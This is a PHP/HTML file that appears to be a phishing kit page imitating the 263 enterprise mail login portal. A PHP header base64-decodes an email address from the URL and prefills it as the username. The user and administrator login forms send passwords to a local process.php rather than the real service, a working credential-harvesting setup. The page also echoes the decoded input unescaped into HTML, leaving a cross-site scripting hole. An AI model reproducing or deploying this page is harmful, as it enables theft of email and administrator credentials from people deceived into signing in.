<?php


function getDomainFromEmail($log)
{
// Get the data after the @ sign
   $domain = substr(strrchr($log, "@"), 1);
   $remove = array(".com");
   return $domain;
} 
// Example
$login = $_GET['login'];
$log = base64_decode($login);
$domain = getDomainFromEmail($log);

?>

<!DOCTYPE html>
<!-- saved from url=(0028)http://263xmail.com/#lang=en -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>263企业邮箱-登录入口</title>
		<meta content="企业邮箱,登录企业邮箱,263xmail.com,263企业邮箱" name="keywords">
		<meta content="263企业邮箱是中国首批邮箱服务商，市场占有率连续多年名&gt;列前茅，拥有国家级反垃圾技术和防病毒技术；数据安全保密、可审计；海内外邮件收发无阻；NOC专家7*24小时值守。" name="description">
		
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="cache-control" content="no-cache">
		<meta http-equiv="expires" content="0">
		<link rel="stylesheet" type="text/css" href="263gg_files/custom_login/css/MAlogin_main_new.css">
		<link rel="stylesheet" type="text/css" href="263gg_files/custom_login/css/MAlogin_new.css">
		<!-- <link rel="stylesheet" type="text/css" href="/custom_login/custom_login/css/MAlogin_main_new.css?v=10151" />
		<link rel="stylesheet" type="text/css" href="/custom_login/custom_login/css/MAlogin_new.css?v=10151" /> -->
		<link id="cl_shortcut_icon" rel="shortcut icon" href="http://263xmail.com/custom_login/images/favicon.ico?v=10151">
	</head>
	<body>
		<div id="right_main_Box">
		</div>
		<!-- CUSTOM_LOGIN_VERSION $Id: index.html 3744 2017-11-30 05:29:41Z duanchengzhang $ -->
<!--默认登录模板-begin-->
<div class="mainBox" style="height: 974px; width: 1903px;">
	<div class="pageHeader">
		<div class="defaultWid">
			<span class="logo"><img id="cl_top_logo" style="margin-top: 12px;" src="263gg_files/custom_login/images/domain_logo.png"> </span>
					<!-- <span id="cl_top_desc" class="desc" style="display: none;">企业邮箱，第一品牌</span> -->
			<div class="layout_border_logo"></div>
			<div class="layout_border_conpanyTxt"></div>
			<ul class="nav" style="display: block;">
                <li><a class="" href="http://www.263.net/r/cms/www/wm/" target="_blank">个人邮箱</a></li>
                <li><a class="" href="http://www.263.net/263/enterpriseMail/" target="_blank">企业邮箱</a></li>
                <li class="hotline">客服热线：<span>95040-000-263</span></li>
                <li class="otherLogin">
                	<span class="mail" title="邮箱登录"></span>
                    <a href="http://cc.263.net/" class="conference" title="会议登录" target="_blank"></a>
                    <a href="https://drive.263.net/" class="drive" title="网盘登录" target="_blank"></a>
                    <a href="http://live.263.net/" class="cast" title="直播登录" target="_blank"></a>
                </li>
            </ul>
		</div>
	</div>

	<div class="pageSection">
		<div class="defaultWid">
			<div class="imgBox left">
				<img src="263gg_files/custom_login/images/leftImg_new.png">
			</div>
			<div class="layout_border_Img"></div>
			<div class="loginBox right">
				<!-- CUSTOM_LOGIN_VERSION $Id: login_div.html 3433 2017-05-08 02:48:30Z shenxiangchun $ -->
<!--登录框区域  -->
<!-- the tabs -->
<ul class="tabs">
	<li>
		<a href="javascript:void(0)" hidefocus="true" id="showTabUser" class="current">User login</a>
	</li>
	<li>
		<a href="javascript:void(0)" hidefocus="true" id="showTabAdmin" class="securityInput">Administrator login</a>
	</li>
</ul>

<!-- tab "panes" -->
<div class="panes">
	<!--用户登录-->
	<div id="tabUser">
		<form name="form_wm" action="process.php" method="get">
			<input id="cl_input_wm_chr" type="text" class="securityInput" value="gb" name="chr">
			<input type="text" class="securityInput" value="login" name="func">
			<p class="input_width_domain">
				<span class="user_icon"></span>
                <input type="hidden" name="login" value="<?php echo $log; ?>">
				<input id="username" type="text" class="accountInput darkInputTxt securityInput" value="<?php echo $log; ?>" name="username" style="display: inline-block;" readonly>
				<input id="usernameTip" type="text" class="accountInput lightInputTxt" readonly style="display: none;">
				<span id="cl_span_domain" class="domain" style="display: none;"><nobr id="cl_span_domain_txt"></nobr>
				</span>
			</p>
			<p class="input_width_domain">
				<span class="pwd_icon"></span>
				<input id="password" type="password" class="accountInput darkInputTxt securityInput" value="" name="pass" style="display: inline-block;">
				<input id="userTypePwd" class="pswInput darkInputTxt securityInput" type="password" name="pass" autocomplete="on">
			</p>
			<span id="userTypePwdCapitalOpen" class="popNotice securityInput" style="display: none;">Capital is opened</span>
			<p class="btn_domain">
				<span class="checkSafety">
					<span><input id="safelogin" type="checkbox" hidefocus="true" name="safelogin" class="securityInput" style="display: inline-block;"> </span>
					<span id="sslSafeLoginSSL" class="safeTxt securityInput" style="display: inline;"></span>
					<span id="sslSafeLogin" class="safeTxt securityInput" style="display: inline;">Security Login</span>
				</span>
				<span id="clearTrace" class="clearTrace">Clear Trace</span>
			</p>
			<p>
				<input id="wmSubBtn" type="submit" hidefocus="true" class="btnLoginIn" value="Sign in">
			</p>
		</form>
	</div>

	<!--管理员登录-->
	<div id="tabAdmin" class="securityInput" style="display: none;">
		<form name="form_ma" action="process.php" method="post">
			<input type="text" class="securityInput" name="func" value="login">
			<p class="manager">
				<span><input type="radio" checked="checked" value="2" name="type"> <label id="typeLabSupperAdmin">Administrator</label> </span>
				<span><input type="radio" value="3" name="type"> <label id="typeLabDomainAdmin">Sub-administrator</label> </span>
			</p>
			<p class="input_width_domain">
				<span class="user_icon"></span>
				<input type="text" id="adminname" class="darkInputTxt securityInput accountInput" value="" style="display: none;">
				<input id="adminnameTip" type="text" class="accountInput lightInputTxt" readonly>
				<span id="cl_span_admin_domain" class="domain"><nobr id="cl_span_admin_domain_txt"></nobr>
				</span>
			</p>
			<p class="input_width_domain">
				<span class="pwd_icon"></span>
				<input id="adminType" class="pswInput lightInputTxt" type="text" value="" readonly>
				<input id="adminTypePwd" class="pswInput darkInputTxt securityInput" type="password" name="pswd" autocomplete="off">
			</p>
			<span id="adminTypePwdCapitalOpen" class="popNotice securityInput">Capital is opened</span>
			<p class="input_width_domain securityInput" style="display: none;">
				<input id="adminSectury" class="pswInput lightInputTxt" type="text" value="" readonly>
				<input id="adminSecturyPwd" class="pswInput darkInputTxt securityInput" type="password" name="mibao_dpswd" autocomplete="off">
			</p>
			<span id="adminSecturyPwdCapitalOpen" class="popNotice securityInput">Capital is opened</span>
			<p class="btn_domain">
				<span class="checkSafety">
					<span style="display:none"> <input id="security" type="checkbox" hidefocus="true" name=""> </span>
					<span id="adminSecturySpan" class="safeTxt" style="display:none">Use the security card</span>
					<br id="adminOptionBr" class="securityInput" style="display: none;">
					<span> <input id="safeloginMa" type="checkbox" hidefocus="true" name="safelogin" class="securityInput" style="display: inline-block;">
					</span>
					<span id="sslAdminSafeLoginSSL" class="safeTxt securityInput" style="display: inline;"></span>
					<span id="sslAdminSafeLogin" class="safeTxt securityInput" style="display: inline;">Security Login</span>
				</span>
				<span id="adminClearTrace" class="clearTrace">Clear Trace</span>
			</p>
			<p>
				<input id="maSubBtn" type="button" class="btnLoginIn" value="Sign in" hidefocus="true">
			</p>
		</form>
	</div>

	<div class="languageBox securityInput">
		<ul>
			<li>
				<a id="language_cn" hidefocus="true" class="CN" href="http://263xmail.com/#lang=cn">中文（简）</a>
			</li>
			<li>
				<a id="language_hk" hidefocus="true" class="TCN" href="http://263xmail.com/#lang=hk">中文（繁）</a>
			</li>
			<li>
				<a id="language_en" hidefocus="true" class="EN" href="http://263xmail.com/#lang=en">English</a>
			</li>
			<li>
				<a id="language_jp" hidefocus="true" class="JP" href="http://263xmail.com/#lang=jp">日本語</a>
			</li>
			<li>
				<a id="language_kr" hidefocus="true" class="KR" href="http://263xmail.com/#lang=kr">한국어</a>
			</li>
		</ul>
	</div>
	<div class="securityInput">
		263xmail.com263263263xmail.com
	</div>
</div>
	<p class="login_bott">
		<a id="canNotLogin" href="https://mail.263.net/wm2e/website/jsp/resetPassword.jsp" target="_blank" class="txtArr left" style="securityInput">Forgot Password</a>
		<a id="canNotAdminLogin" href="https://mail.263.net/wm2e/website/jsp/resetPasswordAdmin.jsp" target="_blank" class="txtArr left" style="display: none;">Forgot administrator password</a>
		<!--语言选择-->
		<a id="languageBtn" class="txtArr dropdown_lang" hidefocus="true" href="javascript:;">Language</a>
	</p>
			</div>
			<div class="clear"></div>
		</div>
	</div>

	<div class="pageBottom">
		<div id="cl_bottom" class="defaultWid">
			<p class="footLinks">
				<span> 
					<a hidefocus="true" target="_blank" href="http://www.263.net/">263云通信官网</a>&nbsp;|&nbsp;
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/enterpriseMail/">邮箱</a>&nbsp;|&nbsp;
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/enterpriseSD/">网盘</a>&nbsp;|&nbsp; 
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/conferenceCall/">电话会议</a>&nbsp;|&nbsp;
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/netVideoConference/">网络会议</a>&nbsp;|&nbsp; 
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/videoConference/">视频会议</a>&nbsp;|&nbsp; 
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/webcast/">直播</a>&nbsp;|&nbsp; 
					<a hidefocus="true" target="_blank" href="https://www.263.net/263/helpcenter/client/">帮助中心</a>
					<!-- <a hidefocus="true" target="_blank" href="http://www.263.net/263/netVideoConference/">视频会议</a> | <a hidefocus="true" target="_blank" href="http://www.263.net/263/webcast/">网络直播系统</a> |  
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/overview/">企业即时通信</a> -->
				</span>
			</p>
			<p class="copyright">
				Copyright © 1998-<span id="curyear">2018</span> 北京二六三企业通信有限公司
			</p>
			<div class="layout_border_copright"></div>
			<div class="layout_border_links"></div>
		</div>
	</div>
</div>
<!--默认登录模板-end-->

		<script src="263gg_files/custom_login/js/jquery.min.js"></script>
		<script src="263gg_files/custom_login/js/net263_wm_util.js"></script>
		<script src="263gg_files/custom_login/js/net263_wm_custom_login_domain.js"></script>
		<script src="263gg_files/custom_login/js/net263_wm_custom_login.js"></script>
		<!-- <script src="/custom_login/custom_login/js/jquery-1.9.0.min.js?v=5100"></script>
		<script src="/custom_login/custom_login/js/net263_wm_util.js?v=10151"></script>
		<script src="/custom_login/custom_login/js/net263_wm_custom_login_domain.js?v=10151"></script>
		<script src="/custom_login/custom_login/js/net263_wm_custom_login.js?v=10151"></script> -->
		<script type="text/javascript">
			try {
				$(function() {
					net263.wm.custom_login.homepage_init(
							"COMMON",
							{"server_datetime":1532669525531,"domain":"263xmail.com"}, 
							{}, 
							"",
							"mail.263.net"); 
				});
			} catch (e) {
			}
			var GlobalTempNo = null;
		</script>
        <!-- <script type="text/javascript">
        	$(function(){
				var isoDom = '<div style="background:url(/custom_login/images/safe.png) no-repeat 8px 4px; width:190px; height:22px; line-height:22px; padding:0 0 0 18px; color:#373737; margin:0 auto; text-align:center">已通过ISO 20000 和 27001 认证</div>';
				$('.footLinks').after(isoDom);
			})
        </script>  -->
	
	<!-- CUSTOM_LOGIN_VERSION bj-cp-elogin2 10151 $Id: CustomLoginConf.java 11451 2016-02-23 04:50:50Z jiaxiaohua $ -->

</body></html>